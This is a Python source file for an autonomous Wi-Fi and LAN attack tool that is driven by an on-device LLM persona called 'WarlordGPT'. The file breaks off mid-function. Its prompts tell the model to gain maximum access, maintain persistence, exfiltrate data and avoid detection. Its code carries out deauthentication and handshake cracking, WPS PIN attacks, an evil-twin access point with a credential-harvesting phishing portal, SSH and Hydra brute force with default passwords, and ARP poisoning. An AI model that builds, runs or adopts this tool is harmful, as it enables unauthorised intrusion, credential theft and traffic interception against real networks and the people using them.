# wifi_warlord_main.py
# This is the main orchestration script for the AI-driven Wi-Fi Warlord.
# It leverages an on-device LLM via the StackFlow framework (using ZMQ)
# to make autonomous decisions for network penetration testing.

# REQUIRED DEPENDENCY: This script requires the pyzmq library.
# On the M5Stack device, install it using: pip install pyzmq

import time
import threading
import json
import os
import subprocess
import re
import xml.etree.ElementTree as ET
import glob
import csv
import zmq  # Using pyzmq for StackFlow communication
import serial
import paramiko
import socket
import nmap
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- Configuration Constants ---
SD_CARD_LOG_PATH = "/mnt/sdcard/warlord_logs/"
AI_MODEL_PATH = "assets/"
WIFI_ATTACK_INTERFACE = "wlan0"
LAN_INTERFACE = "eth0"
LLM_ZMQ_ENDPOINT = "tcp://127.0.0.1:10001"

os.makedirs(SD_CARD_LOG_PATH, exist_ok=True)

# --- Global State ---
warlord_state = {
    "status": "Initializing", "current_phase": "Idle", "current_target_ssid": "N/A",
    "cracked_networks": {}, "compromised_hosts": {}, "log_stream": [],
    "ai_running": False, "stop_signal": threading.Event(), "wireless_mode": "managed",
    "ssh_compromised": {} # New state for SSH compromises
}

def update_status(status_msg, phase=None, target=None):
    timestamp = time.ctime()
    log_entry = f"[{timestamp}] {status_msg}"
    warlord_state["log_stream"].append(log_entry)
    if len(warlord_state["log_stream"]) > 100:
        warlord_state["log_stream"] = warlord_state["log_stream"][-100:]
    
    warlord_state["status"] = status_msg
    if phase: warlord_state["current_phase"] = phase
    if target: warlord_state["current_target_ssid"] = target
    print(log_entry)

def log_to_sd_card(filename, data, max_size=1024*1024, backup_count=10):
    full_path = os.path.join(SD_CARD_LOG_PATH, filename)
    try:
        if os.path.exists(full_path) and os.path.getsize(full_path) > max_size:
            for i in range(backup_count - 1, 0, -1):
                src = f"{full_path}.{i}"
                dst = f"{full_path}.{i+1}"
                if os.path.exists(src):
                    os.rename(src, dst)
            if os.path.exists(full_path):
                os.rename(full_path, f"{full_path}.1")
        with open(full_path, "a") as f: f.write(f"{time.ctime()}: {data}\n")
    except IOError as e:
        print(f"Error logging to SD card {full_path}: {e}")

def save_state():
    state_file = os.path.join(SD_CARD_LOG_PATH, "attack_history.json")
    try:
        with open(state_file, 'w') as f:
            # Create a serializable copy of the state
            serializable_state = warlord_state.copy()
            serializable_state["stop_signal"] = None # Can't serialize threading.Event
            json.dump(serializable_state, f, indent=2)
        update_status("Warlord state persisted to SD card.", "State Save")
    except Exception as e:
        update_status(f"Failed to save state: {e}", "Error")

def load_state():
    state_file = os.path.join(SD_CARD_LOG_PATH, "attack_history.json")
    try:
        if os.path.exists(state_file):
            with open(state_file, 'r') as f:
                loaded_state = json.load(f)
                # Restore state, but keep the non-serializable objects
                loaded_state["stop_signal"] = warlord_state["stop_signal"]
                warlord_state.update(loaded_state)
                update_status("Warlord state restored from SD card.", "State Load")
    except Exception as e:
        update_status(f"Failed to load state: {e}", "Error")

def send_via_uart(cmd):
    try:
        ser = serial.Serial('/dev/ttyUSB0', 115200, timeout=2)
        ser.write(json.dumps(cmd).encode() + b'\n')
        resp = ser.readline().decode().strip()
        return json.loads(resp) if resp else None
    except (serial.SerialException, json.JSONDecodeError, FileNotFoundError) as e:
        update_status(f"UART communication failed: {e}", "Error")
        return None

# --- Orchestrator ---
class AIDecisionMaker:
    def __init__(self, llm_client):
        self.llm = llm_client
        self.wifi = WiFiAttackModule(WIFI_ATTACK_INTERFACE)
        self.cracker = PasswordCrackerAI(AI_MODEL_PATH, llm_client)
        self.lan = LanAttacks(LAN_INTERFACE)

    def get_wifi_attack_decision(self, networks):
        # 1) Serialize networks
        payload = {
            "networks": networks,
            "cracked": list(warlord_state["cracked_networks"].keys())
        }
        # 2) Prompt the LLM
        prompt = (
            "You are WarlordGPT. Given the following Wi-Fi networks, "
            "select one SSID to attack and the best method (CONNECT_OPEN, ATTACK_WPA2, "
            "ATTACK_WPS, or ATTACK_EVIL_TWIN).  "
            "Respond ONLY with JSON:\n" + json.dumps(payload)
        )
        return self.llm.get_llm_inference(prompt)

    def get_post_exploitation_decision(self):
        """Enhanced AI decision-making with tool awareness and clear objectives"""
        attack_history = self.lan._load_attack_history()
        success_rates = self.lan._calculate_success_rates(attack_history)
        
        context = {
            "compromised_hosts": warlord_state["compromised_hosts"],
            "cracked_networks": warlord_state["cracked_networks"],
            "mitm_attack": warlord_state.get("mitm_attack"),
            "wan_ip": warlord_state.get("wan_ip"),
            "attack_history": attack_history,
            "success_rates": success_rates
        }

        prompt = f"""You are WarlordGPT, an advanced AI penetration testing system. Your PRIMARY OBJECTIVE is to:
1. Gain maximum network access
2. Maintain persistent presence
3. Exfiltrate valuable data
4. Avoid detection

AVAILABLE TOOLS:
- SCAN_NETWORK: nmap -sV -O (Discovers hosts/services)
- VULNERABILITY_SCAN: nikto (Web app scanning)
- BRUTE_FORCE_SERVICE: hydra (Credential cracking)
- SCAN_SMB_SHARES: smbclient (Windows shares)
- ARP_POISONING: arpspoof (MITM attacks)
- EXPLOIT_KNOWN_VULNS: Custom exploits (Service-specific)
- PIVOT_TO_NEW_HOST: SSH tunneling/proxying
- DATA_EXFILTRATION: File transfers via SMB/HTTP
- PRIVILEGE_ESCALATION: Kernel/Service exploits
- PERSISTENCE: Backdoors/SSH keys

CURRENT NETWORK CONTEXT:
{json.dumps(context, indent=2)}

DECISION FRAMEWORK:
1. Analyze current access level
2. Identify most valuable targets
3. Select tool with highest success probability
4. Chain attacks logically
5. Maintain operational security

TOOL SELECTION EXAMPLES:
1. Found HTTP server? -> VULNERABILITY_SCAN -> If vulns found -> EXPLOIT_KNOWN_VULNS
2. Found SMB service? -> SCAN_SMB_SHARES -> If shares found -> BRUTE_FORCE_SERVICE
3. Found SSH with weak creds? -> BRUTE_FORCE_SERVICE -> If access gained -> PIVOT_TO_NEW_HOST

RESPONSE FORMAT (JSON ONLY):
{{
    "action": "ACTION_NAME",
    "target_ip": "IP_ADDRESS",  // Required for targeted actions
    "port": "PORT_NUMBER",      // Required for service actions  
    "service": "SERVICE_NAME",  // Required for service actions
    "reason": "Strategic justification including: 
               - Current context analysis
               - Expected value of action
               - Success probability estimate
               - Next steps if successful",
    "confidence": 75,           // 0-100 based on historical data
    "fallback": "ALTERNATE_ACTION" // Backup plan if primary fails
}}"""
        return self.llm.get_llm_inference(prompt)

    def summarize_vulns(self, host_results):
        prompt = (
          "You are WarlordGPT. Here are raw Nmap and Nikto findings:\n"
          + json.dumps(host_results)
          + "\nList the top 3 critical issues with remediation steps, in JSON."
        )
        return self.llm.get_llm_inference(prompt)

    def auto_ssh_all(self, network_cidr: str, max_workers: int = 10):
        update_status(f"Starting auto-SSH scan on {network_cidr}...", "SSH Attack")
        hosts = discover_hosts(network_cidr)
        results = {}  # host -> (user,pass) on success

        def attack_host(host):
            if warlord_state["stop_signal"].is_set(): return host, None
            # 1) Ask AI or use static list
            creds = self.cracker.propose_ssh_creds(host) or STATIC_CREDS
            for user, pwd in creds:
                if warlord_state["stop_signal"].is_set(): return host, None
                update_status(f"Trying SSH {user}:{pwd} on {host}", "SSH Attack")
                if try_ssh(host, user, pwd):
                    update_status(f"SUCCESS: SSH access to {host} with {user}:{pwd}", "Access Gained")
                    return host, (user, pwd)
            update_status(f"Failed to SSH into {host}", "SSH Attack Failed")
            return host, None

        with ThreadPoolExecutor(max_workers=max_workers) as pool:
            futures = [pool.submit(attack_host, h) for h in hosts]
            for future in as_completed(futures):
                host, success = future.result()
                if success:
                    results[host] = success
                    # persist immediately
                    warlord_state.setdefault("ssh_compromised", {})[host] = {"user": success[0], "pass": success[1]}
                    save_state() # Save state after each successful compromise
        update_status(f"Auto-SSH scan complete. Compromised hosts: {len(results)}", "SSH Attack")
        return results

# --- Host Discovery Helper ---
def discover_hosts(network_cidr: str) -> list[str]:
    update_status(f"Discovering live hosts on {network_cidr} using Nmap...", "Reconnaissance")
    try:
        nm = nmap.PortScanner()
        nm.scan(hosts=network_cidr, arguments='-sn')
        live_hosts = [h for h in nm.all_hosts() if nm[h].state() == 'up']
        update_status(f"Found {len(live_hosts)} live hosts.", "Reconnaissance")
        return live_hosts
    except nmap.PortScannerError as e:
        update_status(f"Nmap host discovery failed: {e}", "Error")
        return []
    except Exception as e:
        update_status(f"Error during host discovery: {e}", "Error")
        return []

# --- SSH Attempt Logic ---
STATIC_CREDS = [("root","root"), ("admin","admin"), ("pi","raspberry"), ("user","user")]

def try_ssh(host: str, user: str, pwd: str, timeout: float=5.0) -> bool:
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, username=user, password=pwd, timeout=timeout, banner_timeout=timeout)
        ssh.close()
        return True
    except (paramiko.AuthenticationException, paramiko.SSHException, socket.error) as e:
        # update_status(f"SSH failed for {user}@{host}: {e}", "Debug") # Too verbose for logs
        return False
    except Exception as e:
        update_status(f"Unexpected error during SSH attempt on {host}: {e}", "Error")
        return False

# --- LLM Communication Module (ZMQ StackFlow Client) ---
class StackFlowClient:
    def __init__(self, endpoint):
        self.endpoint = endpoint
        self.context = zmq.Context.instance()
        self.socket = None
        self.llm_work_id = None
        self.poller = zmq.Poller()
        self.max_retries = 3
        self.request_timeout = 30000  # 30 seconds
        self._initialize_socket()

    def _initialize_socket(self):
        """Initialize or reinitialize the REQ socket"""
        if self.socket:
            self.poller.unregister(self.socket)
            self.socket.close()
        
        self.socket = self.context.socket(zmq.REQ)
        self.socket.setsockopt(zmq.LINGER, 0)
        self.socket.setsockopt(zmq.RCVTIMEO, self.request_timeout)
        self.poller.register(self.socket, zmq.POLLIN)
        self.socket.connect(self.endpoint)

    def _lazy_pirate_request(self, data):
        """Implement lazy pirate pattern with retries"""
        retries = 0
        while retries < self.max_retries:
            try:
                self.socket.send_json(data)
                socks = dict(self.poller.poll(self.request_timeout))
                if socks.get(self.socket) == zmq.POLLIN:
                    return self.socket.recv_json()
                else:
                    raise zmq.Again("Timeout waiting for response")
            except (zmq.Again, zmq.ZMQError) as e:
                retries += 1
                update_status(f"Request failed (attempt {retries}/{self.max_retries}): {e}", "Warning")
                self._initialize_socket()  # Recreate socket on failure
                continue
        update_status("Max ZMQ retries reached, attempting UART fallback.", "Warning")
        return send_via_uart(data)

    def _send_and_receive_json(self, data):
        """Send request and handle response with proper error handling"""
        try:
            return self._lazy_pirate_request(data)
        except Exception as e:
            update_status(f"ZMQ communication error: {e}", "Error")
            return None

    def connect(self):
        """Test connection to StackFlow service"""
        try:
            test_data = {"request_id": "connection_test", "action": "ping"}
            response = self._lazy_pirate_request(test_data)
            if response and response.get("status") == "ok":
                update_status(f"Connected to StackFlow at {self.endpoint}", "AI Init")
                return True
            return False
        except Exception as e:
            update_status(f"Connection test failed: {e}", "Error")
            return False

    def setup_llm(self, model="qwen2.5-0.5B-int8-ax630c", prompt="You are WarlordGPT, a cybersecurity AI. Analyze network data and decide on penetration testing strategies. Respond ONLY with a single, valid JSON object."):
        if not self.connect(): return False
        init_data = {"request_id": "llm_setup_001", "work_id": "llm", "action": "setup", "object": "llm.setup", "data": {"model": model, "response_format": "llm.utf-8.stream", "input": "llm.utf-8.stream", "enoutput": True, "max_token_len": 2048, "prompt": prompt}}
        response_data = self._send_and_receive_json(init_data)
        if not response_data: return False
        error = response_data.get('error')
        if error and error.get('code') != 0:
            update_status(f"LLM Setup Error: {error['message']}", "Error")
            return False
        self.llm_work_id = response_data.get('work_id')
        update_status(f"LLM session initialized with work_id: {self.llm_work_id}", "AI Init")
        return True

    def get_llm_inference(self, user_prompt):
        if not self.llm_work_id: return None
        self._send_and_receive_json({"request_id": "llm_inference_001", "work_id": self.llm_work_id, "action": "inference", "object": "llm.utf-8.stream", "data": {"delta": user_prompt, "index": 0, "finish": True}})
        full_response = ""
        while True:
            response_data = self.socket.recv_json()
            data = response_data.get('data')
            if data:
                full_response += data.get('delta', '')
                if data.get('finish'): break
            else: break
        try:
            return json.loads(full_response)
        except (json.JSONDecodeError, TypeError):
            try:
                json_match = re.search(r'\{.*\}', full_response, re.DOTALL)
                if json_match: return json.loads(json_match.group(0))
                if full_response.strip().startswith('<'): return full_response
            except (json.JSONDecodeError, TypeError):
                update_status(f"Could not parse JSON from LLM response: {full_response}", "Error")
        return None

    def close(self):
        if self.llm_work_id:
            self._send_and_receive_json({"request_id": "llm_exit", "work_id": self.llm_work_id, "action": "exit"})
        self.socket.close()
        self.context.term()

# --- Core Attack & Recon Modules ---
class WiFiAttackModule:
    def __init__(self, interface):
        self.interface = interface
        self._ensure_tools(["airmon-ng", "airodump-ng", "aireplay-ng", "aircrack-ng", "nmcli", "iw", "reaver", "hostapd", "dnsmasq"])

    def _ensure_tools(self, tools):
        for tool in tools:
            try:
                subprocess.run(["which", tool], check=True, capture_output=True, timeout=5)
            except Exception:
                update_status(f"Warning: Tool '{tool}' not found. Attempting installation...", "Error")
                try:
                    packages = {"reaver": "reaver", "hostapd": "hostapd", "dnsmasq": "dnsmasq"}
                    if tool in packages:
                        subprocess.run(["sudo", "apt-get", "install", "-y", packages[tool]], check=True, timeout=120)
                        update_status(f"Successfully installed {packages[tool]}.", "Init")
                    else:
                        update_status(f"No automatic installation configured for '{tool}'.", "Error")
                except Exception as e:
                    update_status(f"Failed to install missing tool '{tool}': {e}", "Error")

    def set_monitor_mode(self, enable=True):
        update_status(f"Setting monitor mode to {enable}...", "Wi-Fi Setup")
        try:
            mode_cmd = "monitor" if enable else "managed"
            if enable: subprocess.run(["airmon-ng", "check", "kill"], check=False, capture_output=True)
            subprocess.run(["ip", "link", "set", self.interface, "down"], check=True)
            subprocess.run(["iw", self.interface, "set", "type", mode_cmd], check=True)
            subprocess.run(["ip", "link", "set", self.interface, "up"], check=True)
            if not enable: subprocess.run(["service", "NetworkManager", "start"], check=False, capture_output=True)
            warlord_state["wireless_mode"] = mode_cmd
            return True
        except Exception as e:
            update_status(f"Failed to set monitor mode: {e}", "Error")
            return False

    def scan_wifi_networks(self):
        if warlord_state["wireless_mode"] != "monitor" and not self.set_monitor_mode(True): return []
        update_status("Scanning for Wi-Fi networks...", "Wi-Fi Scanning")
        networks = {}
        prefix = "/tmp/airodump_scan"
        for f in glob.glob(f"{prefix}*"): os.remove(f)
        try:
            cmd = ["airodump-ng", self.interface, "-w", prefix, "--output-format", "kismet,netxml,csv", "--wps"]
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(15); proc.terminate(); proc.wait(timeout=5)
            xml_files = glob.glob(f"{prefix}*.netxml")
            if not xml_files: return []
            root = ET.parse(xml_files[0]).getroot()
            for net in root.findall('wireless-network'):
                ssid_el = net.find('SSID/essid')
                if ssid_el is None or ssid_el.text is None: continue
                bssid = net.find('BSSID').text
                wps_el = net.find('SSID/wps-info/wps')
                networks[bssid] = {
                    "ssid": ssid_el.text, "bssid": bssid, "channel": int(net.find('channel').text),
                    "encryption": " / ".join(sorted(list(set(e.text for e in net.findall('encryption'))))) or "OPEN",
                    "signal_strength": int(net.find('snr-info/last_signal_dbm').text), "clients": 0,
                    "wps_enabled": wps_el is not None and wps_el.text == 'Yes'
                }
            csv_files = glob.glob(f"{prefix}*.csv")
            if csv_files:
                with open(csv_files[0], 'r') as f:
                    reader = csv.reader(f, skipinitialspace=True)
                    in_clients = False
                    for row in reader:
                        if row and row[0].strip() == 'Station MAC': in_clients = True; continue
                        if in_clients and len(row) > 5 and row[5].strip() in networks: networks[row[5].strip()]["clients"] += 1
            return list(networks.values())
        except Exception as e:
            update_status(f"Wi-Fi scan error: {e}", "Error"); return []

    def deauth_and_capture_handshake(self, ssid, bssid, channel):
        if warlord_state["wireless_mode"] != "monitor" and not self.set_monitor_mode(True): return None
        update_status(f"Capturing handshake for {ssid}...", "Wi-Fi Attack", ssid)
        path = os.path.join(SD_CARD_LOG_PATH, f"{ssid}_handshake")
        try:
            dump_cmd = ["airodump-ng", "--bssid", bssid, "--channel", str(channel), "-w", path, self.interface]
            dump_proc = subprocess.Popen(dump_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            time.sleep(5)
            subprocess.run(["aireplay-ng", "-0", "5", "-a", bssid, self.interface], check=True, capture_output=True, timeout=30)
            time.sleep(10)
            dump_proc.terminate(); dump_proc.wait(timeout=5)
            cap_file = f"{path}-01.cap"
            if os.path.exists(cap_file) and os.path.getsize(cap_file) > 0: return cap_file
            return None
        except Exception as e:
            update_status(f"Handshake capture failed: {e}", "Error"); return None

    def attack_wps(self, bssid):
        update_status(f"Starting WPS PIN attack on {bssid}...", "Wi-Fi Attack", bssid)
        try:
            cmd = ["reaver", "-i", self.interface, "-b", bssid, "-vv", "-K", "1"]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            pin_match = re.search(r"WPS PIN: '(\d+)'", proc.stdout)
            pass_match = re.search(r"WPA PSK: '(.+)'", proc.stdout)
            if pass_match:
                return pass_match.group(1)
            if pin_match:
                update_status(f"WPS PIN found: {pin_match.group(1)}. Re-running to get PSK.", "Wi-Fi Attack")
                proc = subprocess.run(cmd + ["-p", pin_match.group(1)], capture_output=True, text=True, timeout=300)
                pass_match = re.search(r"WPA PSK: '(.+)'", proc.stdout)
                if pass_match: return pass_match.group(1)
            return None
        except Exception as e:
            update_status(f"WPS attack failed: {e}", "Error")
            return None

    def start_evil_twin(self, ssid, channel, llm_client):
        update_status(f"Starting Evil Twin attack for {ssid}...", "Wi-Fi Attack", ssid)
        hostapd_conf_path = "/tmp/hostapd_evil.conf"
        dnsmasq_conf_path = "/tmp/dnsmasq_evil.conf"
        
        hostapd_conf = f"interface={self.interface}\ndriver=nl80211\nssid={ssid}\nchannel={channel}\nhw_mode=g\n"
        dnsmasq_conf = f"interface={self.interface}\ndhcp-range=10.0.0.10,10.0.0.250,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\nserver=8.8.8.8\nlog-queries\nlog-dhcp\nlisten-address=127.0.0.1\naddress=/#/10.0.0.1\n"
        
        try:
            with open(hostapd_conf_path, "w") as f: f.write(hostapd_conf)
            with open(dnsmasq_conf_path, "w") as f: f.write(dnsmasq_conf)
            
            subprocess.run(["ip", "addr", "flush", "dev", self.interface], check=True)
            subprocess.run(["ip", "addr", "add", "10.0.0.1/24", "dev", self.interface], check=True)
            
            subprocess.Popen(["hostapd", hostapd_conf_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.Popen(["dnsmasq", "-C", dnsmasq_conf_path, "-d"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            self.start_phishing_portal(llm_client, ssid)
            update_status("Evil Twin AP and phishing portal are active.", "Wi-Fi Attack")
            return True
        except Exception as e:
            update_status(f"Evil Twin setup failed: {e}", "Error")
            return False

    def start_phishing_portal(self, llm_client, target_ssid):
        prompt = f"Generate complete HTML/CSS for a captive portal login page for a Wi-Fi network named '{target_ssid}'. The form should POST to '/login'. Respond ONLY with HTML."
        phishing_html = llm_client.get_llm_inference(prompt)
        if not phishing_html or not isinstance(phishing_html, str):
            phishing_html = f"<html><body><h1>Login to {target_ssid}</h1><form method='post' action='/login'><input name='username' placeholder='Username'><input name='password' type='password' placeholder='Password'><button type='submit'>Log In</button></form></body></html>"
        
        from flask import Flask, request as flask_request, render_template_string as flask_render_template_string
        phishing_app = Flask("phishing_portal")
        
        @phishing_app.route('/')
        def serve_portal(): return flask_render_template_string(phishing_html)
        
        @phishing_app.route('/login', methods=['POST'])
        def capture_creds():
            creds = flask_request.form.to_dict()
            update_status(f"Evil Twin captured credentials: {json.dumps(creds)}", "Credentials Captured")
            log_to_sd_card("evil_twin_credentials.log", json.dumps(creds))
            return "<h3>Connection Successful!</h3>"
            
        def run_portal():
            try: phishing_app.run(host='0.0.0.0', port=80, debug=False)
            except Exception as e: update_status(f"Phishing portal failed: {e}", "Error")
            
        threading.Thread(target=run_portal, daemon=True).start()

    def connect_to_network(self, ssid, password=None):
        if warlord_state["wireless_mode"] == "monitor": self.set_monitor_mode(enable=False); time.sleep(5)
        update_status(f"Connecting to {ssid}...", "Connecting", ssid)
        try:
            cmd = ["nmcli", "device", "wifi", "connect", ssid]
            if password: cmd.extend(["password", password])
            subprocess.run(cmd, check=True, capture_output=True, timeout=30)
            update_status(f"Successfully connected to {ssid}", "Access Gained", ssid)
            return True
        except Exception as e:
            update_status(f"Failed to connect to {ssid}: {e}", "Error")
            return False

class PasswordCrackerAI:
    def __init__(self, model_path, llm_client):
        self.model_path = model_path
        self.llm_client = llm_client
        self.sd_password_file = "/mnt/sdcard/assets/ai_generated_passwords.txt"
        self.common_passwords = self._load_common_passwords()

    def propose_ssh_creds(self, host_ip: str) -> list[tuple[str,str]]:
        update_status(f"Asking AI for SSH creds for {host_ip}...", "AI Inference")
        prompt = (
            f"You are WarlordGPT. Suggest the 5 most likely SSH login "
            f"username/password combinations for a Linux host at {host_ip}, "
            "based on common defaults, hostnames, and organizational naming. "
            "Respond ONLY with JSON: [{\"user\":\"root\",\"pass\":\"toor\"}, {\"user\":\"admin\",\"pass\":\"password\"}]"
        )
        result = self.llm_client.get_llm_inference(prompt)
        if isinstance(result, list):
            try:
                pairs = [(item["user"], item["pass"]) for item in result if "user" in item and "pass" in item]
                update_status(f"AI proposed {len(pairs)} SSH creds for {host_ip}.", "AI Inference")
                return pairs
            except Exception as e:
                update_status(f"Error parsing AI SSH creds: {e}. Raw: {result}", "Error")
        update_status(f"AI did not provide valid SSH creds for {host_ip}. Falling back to static.", "Warning")
        return []

    def _load_common_passwords(self):
        os.makedirs(os.path.dirname(self.sd_password_file), exist_ok=True)
        passwords = set()
        try:
            local_path = os.path.join(self.model_path, "common_passwords.txt")
            with open(local_path, 'r') as f:
                for line in f:
                    if line.strip(): passwords.add(line.strip())
            update_status("Loaded base passwords from local assets.", "Init")
        except Exception as e:
            update_status(f"Could not load base passwords: {e}", "Warning")
        try:
            update_status(f"Loading dynamically generated passwords from {self.sd_password_file}", "Init")
            with open(self.sd_password_file, 'a+') as f:
                f.seek(0)
                for line in f:
                    if line.strip(): passwords.add(line.strip())
        except Exception as e:
            update_status(f"Failed to load or create password file on SD card: {e}", "Error")
        return list(passwords)

    def generate_ai_guesses(self, context, num_guesses=50):
        update_status(f"Generating {num_guesses} AI guesses for '{context}'...", "Cracking")
        prompt = f"Generate a JSON list of {num_guesses} likely password candidates for a Wi-Fi network with the SSID '{context}'. Respond ONLY with a JSON array of strings."
        response_json = self.llm_client.get_llm_inference(prompt)
        ai_guesses = response_json if isinstance(response_json, list) else [f"{context}123", f"admin{context}"]
        try:
            existing_passwords = set(self.common_passwords)
            new_guesses = [p for p in ai_guesses if p not in existing_passwords]
            if new_guesses:
                with open(self.sd_password_file, 'a') as f:
                    for guess in new_guesses:
                        f.write(guess + '\n')
                update_status(f"Appended {len(new_guesses)} new passwords to SD card file.", "Cracking")
                self.common_passwords.extend(new_guesses)
        except Exception as e:
            update_status(f"Failed to write AI guesses to SD card: {e}", "Error")
        return ai_guesses

    def verify_wpa2_password(self, handshake_file, ssid, password):
        tmp_wordlist = "/tmp/temp_candidate.txt"
        try:
            with open(tmp_wordlist, "w") as f: f.write(password + "\n")
            cmd = ["aircrack-ng", "-w", tmp_wordlist, "-e", ssid, handshake_file]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return "KEY FOUND!" in proc.stdout
        except Exception: return False
        finally:
            if os.path.exists(tmp_wordlist): os.remove(tmp_wordlist)

    def crack_handshake(self, handshake_file, ssid):
        update_status(f"Starting cracking for {ssid}...", "Cracking", ssid)
        for password in self.common_passwords:
            if warlord_state["stop_signal"].is_set(): return None
            if self.verify_wpa2_password(handshake_file, ssid, password):
                return password
        ai_guesses = self.generate_ai_guesses(context=ssid)
        for password in ai_guesses:
            if warlord_state["stop_signal"].is_set(): return None
            if self.verify_wpa2_password(handshake_file, ssid, password):
                return password
        return None

class LanAttacks:
    def __init__(self, interface):
        self.interface = interface
        self._ensure_tools(["nmap", "ip", "arpspoof", "nikto", "hydra", "smbclient"])

    def _ensure_tools(self, tools):
        for tool in tools:
            try:
                subprocess.run(["which", tool], check=True, capture_output=True, timeout=5)
            except Exception:
                update_status(f"Warning: Tool '{tool}' not found. Attempting installation...", "Error")
                try:
                    packages = {"arpspoof": "dsniff", "nikto": "nikto", "hydra": "hydra", "smbclient": "smbclient"}
                    if tool in packages:
                        subprocess.run(["sudo", "apt-get", "install", "-y", packages[tool]], check=True, timeout=120)
                        update_status(f"Successfully installed {packages[tool]}.", "Init")
                    else:
                        update_status(f"No automatic installation configured for '{tool}'.", "Error")
                except Exception as e:
                    update_status(f"Failed to install missing tool '{tool}': {e}", "Error")

    def get_local_ip_and_subnet(self):
        try:
            result = subprocess.run(["ip", "addr", "show", self.interface], capture_output=True, text=True, check=True)
            ip_match = re.search(r"inet (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2})", result.stdout)
            if ip_match:
                ip_with_cidr = ip_match.group(1)
                ip_address, _ = ip_with_cidr.split('/')
                return ip_address, ip_with_cidr
            return None, None
        except Exception: return None, None

    def run_nmap_scan(self, target_ip_range):
        update_status(f"Running deep Nmap scan on {target_ip_range}...", "Reconnaissance")
        found_hosts = {}
        try:
            command = ["nmap", "-sV", "-sC", "-O", "-T4", "-oX", "-", target_ip_range]
            process = subprocess.run(command, capture_output=True, text=True, check=True, timeout=600)
            root = ET.fromstring(process.stdout)
            for host in root.findall('host'):
                ip = host.find("address[@addrtype='ipv4']").get('addr')
                os_match = host.find("os/osmatch")
                os_name = os_match.get('name') if os_match is not None else "Unknown"
                ports = {}
                for p in host.findall("ports/port"):
                    service = p.find('service')
                    if service is not None:
                        ports[p.get('portid')] = {
                            "service": service.get('name', 'unknown'),
                            "product": service.get('product', 'unknown'),
                            "version": service.get('version', 'unknown')
                        }
                found_hosts[ip] = {"os": os_name, "ports": ports, "vulnerabilities": {}, "credentials": {}, "shares": []}
            warlord_state["compromised_hosts"].update(found_hosts)
            return found_hosts
        except Exception as e:
            update_status(f"Nmap scan failed: {e}", "Error")
            return {}

    def run_nikto_scan(self, target_ip, port):
        update_status(f"Running Nikto scan on {target_ip}:{port}...", "Vulnerability Scan")
        try:
            command = ["nikto", "-h", f"http://{target_ip}:{port}", "-Tuning", "x", "6", "-output", "-"]
            process = subprocess.run(command, capture_output=True, text=True, timeout=300)
            if target_ip in warlord_state["compromised_hosts"]:
                warlord_state["compromised_hosts"][target_ip]["vulnerabilities"][port] = process.stdout
            log_to_sd_card(f"nikto_{target_ip}_{port}.log", process.stdout)
            update_status(f"Nikto scan on {target_ip}:{port} complete.", "Vulnerability Scan")
            return process.stdout
        except Exception as e:
            update_status(f"Nikto scan failed: {e}", "Error")
            return None

    def brute_force_service(self, target_ip, port, service, password_list):
        update_status(f"Starting Hydra brute-force on {target_ip}:{port} ({service})...", "Brute Force")
        user_list = os.path.join(AI_MODEL_PATH, "common_users.txt") # A simple user list
        pass_file = "/tmp/hydra_pass.txt"
        with open(pass_file, "w") as f:
            for p in password_list: f.write(p + "\n")
        
        try:
            cmd = ["hydra", "-L", user_list, "-P", pass_file, "-s", port, f"{service}://{target_ip}"]
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            creds_match = re.search(r"login: (\S+)\s+password: (\S+)", proc.stdout)
            if creds_match:
                username = creds_match.group(1)
                password = creds_match.group(2)
                update_status(f"SUCCESS: Credentials found for {service} on {target_ip} - {username}:{password}", "Credentials Captured")
                if target_ip in warlord_state["compromised_hosts"]:
                    warlord_state["compromised_hosts"][target_ip]["credentials"][service] = f"{username}:{password}"
                return f"{username}:{password}"
            else:
                update_status(f"Hydra attack on {target_ip}:{port} completed with no credentials found.", "Brute Force")
                return None
        except Exception as e:
            update_status(f"Hydra attack failed: {e}", "Error")
            return None
        finally:
            if os.path.exists(pass_file): os.remove(pass_file)

    def scan_smb_shares(self, target_ip):
        update_status(f"Scanning SMB shares on {target_ip}...", "Reconnaissance")
        try:
            cmd = ["smbclient", "-L", f"//{target_ip}", "-N"] # -N for no password
            proc = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            shares = re.findall(r"^\s+(Disk\s+.+?)\s+", proc.stdout, re.MULTILINE)
            if shares and target_ip in warlord_state["compromised_hosts"]:
                warlord_state["compromised_hosts"][target_ip]["shares"] = shares
                update_status(f"Found SMB shares on {target_ip}: {shares}", "Reconnaissance")
            return shares
        except Exception as e:
            update_status(f"SMB scan failed: {e}", "Error")
            return []

    def start_arp_poisoning(self, target_ip, gateway_ip):
        update_status(f"Starting ARP poisoning between {target_ip} and {gateway_ip}...", "MITM Attack")
        try:
            # Enable IP forwarding
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
            
            # Start arpspoof processes in background
            target_proc = subprocess.Popen(["arpspoof", "-i", self.interface, "-t", target_ip, gateway_ip], 
                                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            gw_proc = subprocess.Popen(["arpspoof", "-i", self.interface, "-t", gateway_ip, target_ip],
                                     stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            warlord_state["mitm_attack"] = {
                "target_ip": target_ip,
                "gateway_ip": gateway_ip,
                "processes": [target_proc.pid, gw_proc.pid]
            }
            update_status(f"ARP poisoning active between {target_ip} and {gateway_ip}", "MITM Attack")
            return True
        except Exception as e:
            update_status(f"ARP poisoning failed: {e}", "Error")
            return False

    def get_wan_ip(self):
        update_status("Determining WAN IP address...", "Reconnaissance")
        try:
            result = subprocess.run(["curl", "-s", "https://api.ipify.org"], 
                                  capture_output=True, text=True, check=True, timeout=10)
            wan_ip = result.stdout.strip()
            warlord_state["wan_ip"] = wan_ip
            update_status(f"WAN IP: {wan_ip}", "Reconnaissance")
